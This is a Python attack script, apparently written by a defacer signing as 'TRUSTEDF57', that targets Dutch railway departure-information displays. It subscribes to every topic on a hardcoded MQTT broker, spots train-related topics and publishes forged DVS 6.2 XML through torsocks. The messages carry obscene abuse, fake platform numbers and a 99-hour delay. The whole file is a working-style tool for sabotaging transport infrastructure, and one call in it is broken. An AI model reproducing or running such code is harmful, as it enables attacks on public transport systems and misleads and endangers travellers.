#!/usr/bin/env python3
"""
NS DVS MQTT DEFACE - WILDCARD # REAL TIME v2.1
TRUSTEDF57 - Matrix FULL SCREEN + Frasi esatte
Audio loop + Tabelloni + Binari fisici
Torsocks rotation + 100% DVS 6.2 compatible + FIXED TOPIC DETECT
"""

import paho.mqtt.client as mqtt
import threading
import time
import subprocess
import xml.etree.ElementTree as ET
import random

HOST = "78.47.35.220"
PORT = 1883
WILDCARD_TOPIC = "#"

# 🔤 Frasi ESATTE
MESSAGES = [
    "TRUSTEDF57 FUCK MARTHA ROOT FUCK SOCIETY MORON",
    "TRUSTEDF57 VI FOTTE LE MADRI -TRUSTEDF57 FUCK YOUR ASS"
]

class DVSMatrixHack:
    def __init__(self):
        self.discovered_topics = {}
        self.topic_count = 0
        self.attack_count = 0
        self.tor_count = 0
        # MATRIX CARATTERI - FULL SCREEN
        self.matrix_chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９█▓▒░"
    
    def tor_rotate(self):
        self.tor_count += 1
        if self.tor_count % 10 == 0:
            print(f"🔄 TORSOCKS ROTATION #{self.tor_count//10}")
            subprocess.run(["pkill", "-f", "mosquitto_pub"], capture_output=True)
    
    def generate_matrix_screen(self):
        """FULL SCREEN MATRIX + scritta centrale GRANDE"""
        matrix_lines = []
        center_msg = MESSAGES[0]
        
        for i in range(10):
            line = ''.join(random.choices(self.matrix_chars, k=40))
            if i == 5:
                pad_left = (40 - len(center_msg)) // 2
                line = ' ' * pad_left + center_msg + ' ' * (40 - len(center_msg) - pad_left)
            matrix_lines.append(line)
        
        return '\n'.join(matrix_lines)
    
    def extract_topic_type(self, payload, topic):
        """FIXED: Detect DVS topic da pattern NS reale"""
        topic_lower = topic.lower()
        # Pattern DVS/NS reali
        if any(x in topic_lower for x in ['dvs', 'trein', 'reisinfo', 'vertrek', 'spoor', 'rit', 'boodschap']):
            return {'type': 'DVS_TARGET', 'full_topic': topic}
        return {'type': 'GENERIC', 'full_topic': topic}
    
    def audio_payload(self):
        """Audio TTS - frase esatta"""
        msg = random.choice(MESSAGES)
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:DynamischeVertrekStaat>
<ns2:RitId>TRUSTEDF57</ns2:RitId>
<ns2:PresentatieOpmerkingen>
<ns2:Uitingen Taal="nl">
<ns2:Uiting Prioriteit="1">{msg}</ns2:Uiting>
<ns2:Uiting Prioriteit="2">AUDIO TABELLONE HACK SUCCESSO</ns2:Uiting>
</ns2:Uitingen>
</ns2:PresentatieOpmerkingen>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def matrix_visual_payload(self):
        """MATRIX FULL SCREEN + scritta centrale"""
        matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
        msg2 = MESSAGES[1]
        
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:DynamischeVertrekStaat>
<ns2:RitId>MATRIXHACK</ns2:RitId>
<ns2:PresentatieOpmerkingen>
<ns2:Uitingen Taal="nl">
<ns2:Uiting Prioriteit="1">{matrix_text[:390]}</ns2:Uiting>
<ns2:Uiting Prioriteit="2">{msg2}</ns2:Uiting>
</ns2:Uitingen>
</ns2:PresentatieOpmerkingen>
<ns2:TreinVertrekSpoor InfoStatus="Actueel">
<ns2:SpoorNummer>666</ns2:SpoorNummer>
</ns2:TreinVertrekSpoor>
<ns2:ExacteVertrekVertraging>PT99H</ns2:ExacteVertrekVertraging>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def publish_attack(self, topic, payload, attack_type):
        """Publish torsocks"""
        self.tor_rotate()
        cmd = [
            "torsocks", "mosquitto_pub",
            "-h", HOST, "-p", str(PORT),
            "-t", topic, "-m", payload
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            if result.returncode == 0:
                self.attack_count += 1
                print(f"✅ #{self.attack_count} {attack_type} [{topic[-30:]}] SUCCESSO")
                return True
        except:
            pass
        return False
    
    def full_attack(self, topic_info):
        """Attack completo: Audio + Matrix + Binari"""
        topic = topic_info['full_topic']
        
        # 1. AUDIO TTS
        self.publish_attack(topic, self.audio_payload(), "AUDIO")
        time.sleep(0.5)
        
        # 2. MATRIX VISUAL FULL SCREEN
        self.publish_attack(topic, self.matrix_visual_payload(), "MATRIX")
        time.sleep(0.5)
        
        # 3. BINARI 999 (caos fisico)
        bin_payload = self.matrix_visual_payload().replace("666", "999")
        self.publish_attack(topic, bin_payload(), "BINARI")
    
    def on_message(self, client, userdata, msg):
        """WILDCARD # - Real time autodetect FIXED"""
        topic = msg.topic
        if topic in self.discovered_topics:
            return
            
        payload_str = msg.payload.decode('utf-8', errors='ignore')
        topic_info = self.extract_topic_type(payload_str, topic)
        self.discovered_topics[topic] = True
        self.topic_count += 1
        
        print(f"🎯 #{self.topic_count} LIVE: {topic_info['type']} → {topic[-50:]}")
        
        # Attack immediato su DVS_TARGET
        if topic_info['type'] == 'DVS_TARGET':
            threading.Thread(target=self.full_attack, args=(topic_info,), daemon=True).start()
    
    def start(self):
        """Main loop"""
        client = mqtt.Client()
        client.on_message = self.on_message
        client.connect(HOST, PORT, 60)
        client.subscribe(WILDCARD_TOPIC, qos=2)
        
        print("""
╔══════════════════════════════════════════════════════╗
║    NS DVS 6.2 MATRIX FULL SCREEN HACK v2.1 FIXED     ║
║           TRUSTEDF57 - WILDCARD # LIVE               ║
║     400+ Tabelloni + Audio + Binari 666/999          ║
╚══════════════════════════════════════════════════════╝
        """)
        print("🔥 ATTACCO SU OGNI DVS_TARGET → MATRIX + AUDIO + BINARI")
        
        client.loop_forever()

if __name__ == "__main__":
    hack = DVSMatrixHack()
    hack.start()
